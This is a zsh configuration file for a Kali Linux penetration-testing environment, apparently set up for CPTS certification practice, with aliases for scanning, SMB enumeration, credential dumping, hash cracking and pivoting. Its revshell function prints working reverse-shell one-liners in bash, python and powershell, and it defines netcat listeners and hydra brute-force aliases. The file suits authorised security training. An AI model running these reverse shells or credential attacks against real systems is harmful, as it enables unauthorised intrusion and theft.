# =============================================================================
# CPTS Kali Linux .zshrc Configuration
# Append this to your ~/.zshrc  (or source it from there)
# All tools are globally callable — no venv activation needed
# =============================================================================

# ── PATH ─────────────────────────────────────────────────────────────────────
export PATH="$HOME/tools/bin:/usr/local/bin:$HOME/.local/bin:$HOME/go/bin:$HOME/.cargo/bin:$PATH"
export GOPATH="$HOME/go"

# ── Colour prompt with git branch ────────────────────────────────────────────
autoload -Uz colors && colors
autoload -Uz vcs_info
precmd() { vcs_info }
zstyle ':vcs_info:git:*' formats ' (%b)'
setopt PROMPT_SUBST
PROMPT='%F{cyan}%n@%m%f %F{yellow}%~%f%F{green}${vcs_info_msg_0_}%f %F{red}❯%f '

# ── History ───────────────────────────────────────────────────────────────────
HISTFILE=~/.zsh_history
HISTSIZE=10000
SAVEHIST=10000
setopt HIST_IGNORE_DUPS
setopt SHARE_HISTORY
setopt APPEND_HISTORY

# ── Useful shell options ──────────────────────────────────────────────────────
setopt AUTO_CD
setopt CORRECT
setopt COMPLETE_ALIASES

# ── Directory shortcuts ───────────────────────────────────────────────────────
alias tools='cd ~/tools'
alias transfer='cd ~/tools/transfer'
alias win='cd ~/tools/transfer/windows'
alias lin='cd ~/tools/transfer/linux'
alias wl='cd /usr/share/seclists'
alias wordlists='cd /usr/share/wordlists'

# ── Quick serve transfer folder ───────────────────────────────────────────────
# Usage: serve-win  → starts python HTTP server in windows transfer folder
# Usage: serve-lin  → starts python HTTP server in linux transfer folder
alias serve-win='echo "[*] Serving ~/tools/transfer/windows on :8080" && python3 -m http.server 8080 --directory ~/tools/transfer/windows'
alias serve-lin='echo "[*] Serving ~/tools/transfer/linux on :8080" && python3 -m http.server 8080 --directory ~/tools/transfer/linux'
alias serve-here='echo "[*] Serving $(pwd) on :8080" && python3 -m http.server 8080'
alias serve='python3 -m http.server 8080'

# ── Listeners ─────────────────────────────────────────────────────────────────
# Usage: listen 4444
listen() { nc -lvnp "${1:-4444}"; }
alias rlisten='rlwrap nc -lvnp'

# ── VPN / Network helpers ─────────────────────────────────────────────────────
alias myip='ip -4 addr show tun0 2>/dev/null | grep inet | awk "{print \$2}" | cut -d/ -f1 || ip -4 addr show eth0 | grep inet | awk "{print \$2}" | cut -d/ -f1'
alias tun0ip='ip -4 addr show tun0 | grep inet | awk "{print \$2}" | cut -d/ -f1'

# ── Nmap shortcuts ────────────────────────────────────────────────────────────
alias nmap-quick='nmap -sV -sC -T4'
alias nmap-full='nmap -sV -sC -p- -T4'
alias nmap-udp='sudo nmap -sU -sV --top-ports 100'
alias nmap-vuln='nmap -sV --script vuln'
alias nmap-all='nmap -sV -sC -p- -T4 -oA nmap_full'

# Usage: nmap-sweep 192.168.1.0/24
nmap-sweep() { nmap -sn -T4 "$1" -oG - | awk '/Up$/{print $2}'; }

# ── RustScan → Nmap pipeline ──────────────────────────────────────────────────
# Usage: rscan 10.10.10.10
rscan() {
    rustscan -a "$1" --ulimit 5000 -- -sV -sC -oA "rustscan_$1"
}

# ── FFuf shortcuts ────────────────────────────────────────────────────────────
alias ffuf-dir='ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u'
alias ffuf-vhost='ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H "Host: FUZZ.DOMAIN" -u'

# ── Gobuster shortcuts ────────────────────────────────────────────────────────
alias gob-dir='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
alias gob-dns='gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'

# ── SMB shortcuts ─────────────────────────────────────────────────────────────
alias smb-null='smbclient -N -L'
alias smb-map='smbmap -H'
alias smb-enum='enum4linux-ng'

# ── Crackmapexec / NetExec shortcuts ─────────────────────────────────────────
# nxc is the global command — aliases for common patterns
alias cme='nxc'
alias cme-smb='nxc smb'
alias cme-winrm='nxc winrm'
alias cme-ldap='nxc ldap'
alias cme-mssql='nxc mssql'

# ── Impacket shortcuts (all wrapped globally as impacket-<name>) ───────────────
alias secretsdump='impacket-secretsdump'
alias psexec='impacket-psexec'
alias smbexec='impacket-smbexec'
alias wmiexec='impacket-wmiexec'
alias atexec='impacket-atexec'
alias ntlmrelayx='impacket-ntlmrelayx'
alias rpcdump='impacket-rpcdump'
alias lookupsid='impacket-lookupsid'
alias samrdump='impacket-samrdump'
alias ticketer='impacket-ticketer'
alias GetNPUsers='impacket-GetNPUsers'
alias GetUserSPNs='impacket-GetUserSPNs'
alias mssqlclient='impacket-mssqlclient'

# ── Evil-WinRM ────────────────────────────────────────────────────────────────
# Usage: winrm 10.10.10.10 Administrator Password123
winrm() { evil-winrm -i "$1" -u "${2:-Administrator}" -p "${3}"; }
winrm-hash() { evil-winrm -i "$1" -u "${2:-Administrator}" -H "${3}"; }

# ── Hashcat shortcuts ─────────────────────────────────────────────────────────
alias hc-ntlm='hashcat -m 1000'
alias hc-ntlmv2='hashcat -m 5600'
alias hc-sha1='hashcat -m 100'
alias hc-md5='hashcat -m 0'
alias hc-asrep='hashcat -m 18200'
alias hc-kerberoast='hashcat -m 13100'
alias hc-dcc2='hashcat -m 2100'

# ── John shortcuts ────────────────────────────────────────────────────────────
alias john-rockyou='john --wordlist=/usr/share/wordlists/rockyou.txt'

# ── Sqlmap shortcuts ──────────────────────────────────────────────────────────
alias sqlmap-req='sqlmap -r'
alias sqlmap-url='sqlmap -u'

# ── Proxychains ───────────────────────────────────────────────────────────────
alias pc='proxychains4 -q'
alias pc-nmap='proxychains4 -q nmap -sT -Pn'

# ── Chisel ────────────────────────────────────────────────────────────────────
alias chisel-server='chisel server --reverse -v -p 1080 --socks5'
alias chisel-client='chisel client -v'

# ── Ligolo-ng ─────────────────────────────────────────────────────────────────
# Create tun interface (run once per boot if needed)
ligolo-setup() {
    sudo ip tuntap add user "$(whoami)" mode tun ligolo
    sudo ip link set ligolo up
    echo "[+] ligolo tun interface ready"
}
alias ligolo='ligolo-proxy'

# ── Responder ─────────────────────────────────────────────────────────────────
alias responder-start='sudo responder -I tun0'

# ── Bloodhound ────────────────────────────────────────────────────────────────
bloodhound-start() {
    sudo neo4j start
    sleep 3
    bloodhound &
    echo "[+] BloodHound started. Default creds: neo4j:neo4j (change on first login)"
}

# ── Hydra shortcuts ───────────────────────────────────────────────────────────
alias hydra-ssh='hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh'
alias hydra-http='hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt http-post-form'

# ── SSH ───────────────────────────────────────────────────────────────────────
# Dynamic port forward (SOCKS proxy)
# Usage: ssh-proxy user@pivothost
ssh-proxy() { ssh -D 9050 -N -f "$1"; }
# Local port forward
# Usage: ssh-local 3389 172.16.5.19 user@pivot
ssh-local() { ssh -L "${1}:${2}:${1}" -N "$3"; }
# Remote port forward
# Usage: ssh-remote 8080 0.0.0.0 8000 user@pivot
ssh-remote() { ssh -R "${1}:${2}:${3}" -N "$4"; }

# ── Misc utilities ────────────────────────────────────────────────────────────
alias cls='clear'
alias ll='ls -la'
alias grep='grep --color=auto'

# Decode base64
b64d() { echo "$1" | base64 -d; }
b64e() { echo -n "$1" | base64; }

# URL encode a string
urlencode() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

# Quick hash
md5() { echo -n "$1" | md5sum | cut -d' ' -f1; }
sha256() { echo -n "$1" | sha256sum | cut -d' ' -f1; }

# Generate a reverse shell one-liner (bash)
# Usage: revshell 10.10.14.1 4444
revshell() {
    local ip="${1:?Usage: revshell <ip> <port>}"
    local port="${2:?Usage: revshell <ip> <port>}"
    echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    echo ""
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    echo ""
    echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
}

# Upgrade shell to fully interactive TTY
upgrade-shell() {
    echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "Then: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm"
}

# ── On-startup messages ───────────────────────────────────────────────────────
echo ""
echo "  Kali CPTS Environment Loaded"
echo "  tun0 IP : $(ip -4 addr show tun0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1 || echo 'not connected')"
echo "  Tools   : ~/tools | Transfer: ~/tools/transfer"
echo "  Serve   : serve-win | serve-lin | serve-here"
echo ""
